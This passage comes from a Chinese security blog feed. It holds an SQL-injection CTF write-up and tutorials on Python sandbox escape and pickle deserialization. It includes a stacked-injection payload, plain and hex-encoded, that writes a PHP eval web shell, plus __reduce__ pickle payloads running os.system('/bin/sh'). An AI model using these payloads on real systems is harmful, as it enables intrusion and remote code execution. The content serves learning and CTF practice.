<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">		$id=waf($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">		$sql = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;</span>.$id;</span><br><span class="line">		$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		</span><br><span class="line">		$result = mysqli_store_result($connect);</span><br><span class="line">		$row = mysqli_fetch_row($result);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;user_id:&#x27;</span>.$row[<span class="number">0</span>].<span class="string">&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;</span>.$row[<span class="number">1</span>].<span class="string">&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;</span>.$row[<span class="number">4</span>].<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>既然有mysqli_multi_query，就会存在堆叠注入，使用上面提到的MySQL预编译来绕过select的限制。</p>
<p>利用堆叠注入像头像上传的位置写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set @xx&#x3D;0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027;prepare x from @xx;execute x;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201015161424.png" alt=""></p>
<h2 id="PwnThyBytes2019-Baby-SQL">PwnThyBytes2019 Baby_SQL</h2>
<h2 id="October-2019-Twice-SQL-Injection">October 2019 Twice SQL Injection</h2>
<h2 id="HITCON-2017-SQL-So-Hard">HITCON 2017 SQL So Hard</h2>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Python沙箱逃逸</title>
    <url>/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="Python沙箱逃逸">Python沙箱逃逸</h1>
<p>上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。</p>
<h2 id="0x01-基础知识">0x01 基础知识</h2>
<p>沙箱：沙箱是一种按照安全策略限制程序行为的执行环境。</p>
<p>沙箱逃逸：就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。</p>
<p>先来给上一道例题源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line">banned = [<span class="string">&quot;import&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;kevin sucks&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;banned&quot;</span>, <span class="string">&quot;cry sum more&quot;</span>, <span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>)</span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># this means nobreak</span></span><br><span class="line">            exec(data)</span><br></pre></td></tr></table></figure>
<p>一般而言沙箱逃逸的题目考到的知识点无非下面5个：</p>
<ul>
<li>python的导包</li>
<li>python执行代码和命令</li>
<li>python文件读取</li>
<li>内置模块</li>
<li>对象创建于引用</li>
</ul>
<p>那么与之相对应的解题思路大致分为5步：</p>
<ol>
<li>测试能否导包</li>
<li>哪些系统包做了限制</li>
<li>内置函数是否可用</li>
<li>静态检测or动态检测</li>
<li>对象之间的引用关系索引</li>
</ol>
<h2 id="0x02-花式导包">0x02 花式导包</h2>
<p>如果我们想在沙箱中getshell的话，必不可少的是要引入Python中执行命令的包，例如os,sys,subprocess等。</p>
<p>有些沙箱使用比较初级的办法，通过正则对输入代码内容进行过滤，如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure>
<p>这个时候，我们突破这种封锁，首先要学习的是Python的各种导包方法。</p>
<h3 id="初阶">初阶</h3>
<p>一般比较常见的是以下几种方法：</p>
<ul>
<li>import xxx</li>
<li>from xxx import *</li>
<li>_<em>import</em>_(“xxx”)</li>
<li>importlib库</li>
<li>imp 库</li>
<li>reload(xxx)</li>
</ul>
<p>第一个和第二个比较熟悉，不用过多赘述，<code>__import__</code>作为一个函数，只能接受字符串参数，返回值可以直接用来操作，通常在动态加载的时候使用这个函数，python2和python3通用：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161327.png" alt=""></p>
<p>importlib模块是对import和<code>__import__</code>的补充，它也可以通过传入字符串来引入一个模块，python2和python3使用方法一样：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161631.png" alt=""></p>
<p>imp库的使用方法：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161942.png" alt=""></p>
<p>reload 的用法比较有意思，假如沙箱导入了os模块，但是删除了system方法,强行使用system执行命令会报错:<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162046.png" alt=""></p>
<p>而我又想用system方法执行命令的话，可以使用reload重新加载os模块，恢复对system方法的引用。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162126.png" alt=""></p>
<h3 id="高阶">高阶</h3>
<p>导包说到本质上其实是python 读取指定包的py文件，并将其加载到解释器的过程。在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是<code>sys.path</code>下的所有路径。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162508.png" alt=""></p>
<p>我使用的是Anaconda管理python版本，在一些常见的Linux发行版本上，路径一般都是在<code>/usr/lib/python3.X</code>目录下。</p>
<p>因此我们可以直接执行对应包的文件，从而实现包的导入。在py2中有execfile这个函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162944.png" alt=""></p>
<p>在python3中没有execfile这个函数，但是又exec，可以通过读文件交给exec执行的方式导入包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163247.png" alt=""></p>
<p>上面说到导包的本质是python读取指定的文件，import的本质是：搜索modules并绑定到局部变量</p>
<p><code>import module_name</code>实质是将<code>module_name.py</code>中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是<code>module</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163713.png" alt=""></p>
<p>现在设置一下modules中<code>os</code>的值为None：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163756.png" alt=""></p>
<p>发现把os从<code>modules</code>中删去就不能直接引入了。但是，我们可以接着设置<code>os</code>的模块的路径，从而引入该模块：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164329.png" alt=""></p>
<p>另外，我们将 sys.modules 中的os 删除即可，这样import 发现 sys.modules没有os这个模块，就会重新创建。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164528.png" alt=""></p>
<h2 id="0x03-执行代码和命令">0x03 执行代码和命令</h2>
<h3 id="动态执行代码">动态执行代码</h3>
<p>(1) eval/exec/execfile</p>
<p>在上文中，已经讲解了exec/execfile的用法。这里再总结一下：</p>
<ul>
<li>exec(source)：动态执行复杂的python代码，函数的返回值永远为None。</li>
<li>execfile(filename)：执行一个py文件的内容。</li>
</ul>
<p>eval用来执行简单的python表达式返回表达式的结果，示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>(2) pickle 序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span>    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span>        </span><br><span class="line">    <span class="keyword">import</span> os        </span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">  admin = A()</span><br><span class="line">  B = pickle.dumps(admin)</span><br><span class="line">  print(pickle.dumps(admin))</span><br><span class="line"><span class="comment"># cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.</span></span><br></pre></td></tr></table></figure>
<p>保存序列化之后的字符串，然后通过pickle.loads加载即可完成代码的执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.loads(<span class="string">&quot;cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>(3) timeit 这个模块是用来测试代码的执行时间的，可以动态执行代码，代码是字符串形式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="执行命令">执行命令</h3>
<p>(1) os模块</p>
<p>可以通过os.system(cmd),os.popen(cmd)调用系统命令，例如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>(2) commands 模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line">print(commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>(3) subprocess模块</p>
<p>subprocess模块是相对比较复杂的，有很多执行命令的函数：</p>
<ul>
<li>subprocess.run() Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</li>
<li>subprocess.call() 执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</li>
<li>subprocess.check_call() Python 2.5中新增的函数。执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。</li>
<li>subprocess.check_output() Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</li>
<li>subprocess.getoutput(cmd) 接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</li>
<li>subprocess.getstatusoutput(cmd) 执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</li>
</ul>
<p>(4) platform 模块</p>
<p>可以调用platform 模块 中的 popen 这个函数执行命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">print(platform.popen(<span class="string">&#x27;ls&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,bufsize= <span class="number">-1</span>).read())</span><br><span class="line">platform.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>(5) pty 模块</p>
<p>pty模块可以生成一个伪终端，可以简单理解为bash，因此是可以执行命令的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ptypty.spawn(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>(6) cgi 模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line">cgi.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="0x04-文件读取">0x04 文件读取</h2>
<h3 id="初阶-v2">初阶</h3>
<p>(1)open（python2，python3）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">open(__file__).read()</span><br></pre></td></tr></table></figure>
<p>(2)file（python2）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file(__file__).read()</span><br></pre></td></tr></table></figure>
<h3 id="高阶-v2">高阶</h3>
<p>(1)codecs模块（python2，python3）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(__file__).read()</span><br></pre></td></tr></table></figure>
<p>(2)types模块（python2）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line">types.FileType(__file__,<span class="string">&#x27;r&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>(3)os.open（python2，python3）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fd = os.open(__file__, os.O_RDONLY)</span><br><span class="line">print(os.read(fd, <span class="number">1024</span>))</span><br></pre></td></tr></table></figure>
<p>(4)file协议</p>
<p>python2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = urllib.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br></pre></td></tr></table></figure>
<p>python3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = urllib.request.urlopen(<span class="string">&#x27;file:///&#x27;</span>+__file__)</span><br><span class="line">print(u.read())</span><br></pre></td></tr></table></figure>
<p>(5)fileinput模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">with</span> fileinput.input(files=(__file__,)) <span class="keyword">as</span> f:</span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    print(line)</span><br></pre></td></tr></table></figure>
<h2 id="0x05-内建模块">0x05 内建模块</h2>
<p>如果沙箱不让我们导入外部模块，或者是要导入的模块被禁用，那我们只能求助于Python的内部模块<code>__builtins__</code>( 即Python 本身默认已经导入模块中的函数)。</p>
<p>dir内置函数可以列出一个模块/类/对象下面所有的属性和函数，查看一下<code>__builtins__</code>中的函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171409.png" alt=""></p>
<p>例如，我们可以引用<code>__import__ </code>来导入os，并执行命令：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102171530.png" alt=""></p>
<p>由于内置模块中的危险函数过多，比如eval,exec等，导致上文使用的沙箱对**<strong>***<em>builtins*</em></strong>****进行了处理，通过 del 关键字将里面的所有函数引用都删除了。</p>
<p>如果保留reload内置函数，我们还可以通过<code> reload( __builtins__)</code> 恢复，但是现在通过<code>__builtins__</code>来进行逃逸已经不现实了。</p>
<h2 id="0x06-对象创建与引用">0x06 对象创建与引用</h2>
<p>删除的是只是函数引用，而不是函数本身，如果你们熟悉C语言的话，函数引用可以理解为函数指针，既然<code>__builtins__</code>中的引用没了，那我们就需要从<strong>其他地方找到敏感函数的引用</strong>，从而实现逃逸。</p>
<p>关于这一块的内容，其实和flask SSTI的内容是一样的，也是通过python的内置类型的继承链来寻找更多的引用，以下字段是寻找继承链的关键：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>介绍</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>__dict__</code></td>
<td>这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性</td>
</tr>
<tr>
<td><code>__class__</code></td>
<td>返回一个实例对应的类型</td>
</tr>
<tr>
<td><code>__base__</code></td>
<td>返回一个类所继承的基类</td>
</tr>
<tr>
<td><code>__subclasses__()</code></td>
<td>返回该类的所有子类</td>
</tr>
<tr>
<td><code>__mro__</code></td>
<td>python支持多重继承，在解析<code>__init__</code>时，定义解析顺序的是子类的<code>__mro__</code>属性（值是类的元组）</td>
</tr>
<tr>
<td><code>__slots__</code></td>
<td>限制类动态添加属性</td>
</tr>
<tr>
<td><code>__getattribute__()</code></td>
<td>获取属性或方法，对模块和类都有效</td>
</tr>
<tr>
<td><code>__getitem__()</code></td>
<td>以索引取值或者键取值</td>
</tr>
<tr>
<td><code>__globals__</code></td>
<td>返回函数所在模块命名空间中的所有变量</td>
</tr>
</tbody>
</table>
<p>其他的具体内容参考flask SSTI即可。</p>
<h2 id="0x07-Reference">0x07 Reference</h2>
<p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p>
<p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p>
<p><a href="https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg">https://mp.weixin.qq.com/s/f5Ra8BtCyEoJmH0gwuvGXg</a></p>
]]></content>
      <categories>
        <category>Web安全基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>Python反序列化漏洞</title>
    <url>/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Python反序列化漏洞">Python反序列化漏洞</h1>
<p>这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等等，Python相对而言没有PHP那么灵活，关于反序列化漏洞的话比较容易理解，主要涉及这么几个概念：pickle，pvm，<code>__reduce__</code>魔术方法。</p>
<p>K0rz3n师傅的文章已经讲的极为透彻了，我就搬运总结学习一下。</p>
<h2 id="0x01-python序列化和反序列化">0x01 python序列化和反序列化</h2>
<h3 id="序列化">序列化</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure>
<p>python3的输出：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202644.png" alt=""></p>
<p>python2的输出：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202846.png" alt=""></p>
<p>虽然看起来有点难理解，但是还是可以清楚地看到我们对象的属性 name ca01h，我们对象所属的类 people 都已近存储在里面了。</p>
<h3 id="反序列化">反序列化</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">d = pickle.loads(c)</span><br><span class="line">d.say()</span><br></pre></td></tr></table></figure>
<p>无论python2还是python3，输出的都是<code>Hello ! My friends</code>，也就是说我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法。</p>
<h2 id="0x02-反序列化漏洞">0x02 反序列化漏洞</h2>
<h3 id="漏洞常见出现地方">漏洞常见出现地方</h3>
<p><strong>1.通常在解析认证token，session的时候</strong></p>
<p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p>
<p><strong>2.可能将对象Pickle后存储成磁盘文件。</strong></p>
<p><strong>3.可能将对象Pickle后在网络中传输。</strong></p>
<p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。</p>
<h3 id="漏洞利用方式">漏洞利用方式</h3>
<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p>
<p>简单说明一下<code>__reduce__()</code>函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</p>
<p>show code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> test</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204054.png" alt=""></p>
<p>稍微解释一下这几个指令：</p>
<ul>
<li>S : 后面跟的是字符串</li>
<li>( ：作为命令执行到哪里的一个标记</li>
<li>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</li>
<li>c ：定义模块名和类名（模块名和类名之间使用回车分隔）</li>
<li>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中</li>
<li>. ：点号是结束符</li>
</ul>
<p>另外p0 p1 p2 p3只是标签，对命令我们的payload没有任何影响。</p>
<p>我们让上面这个结果进行反序列化看一下结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204400.png" alt=""></p>
<p>再来看一个最简单的利用方式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>很明显，反序列化的参数是可控的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">             <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">      </span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Marshal反序列化">0x03 Marshal反序列化</h2>
<p>现在看看还有啥别的序列化库。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103205604.png" alt=""></p>
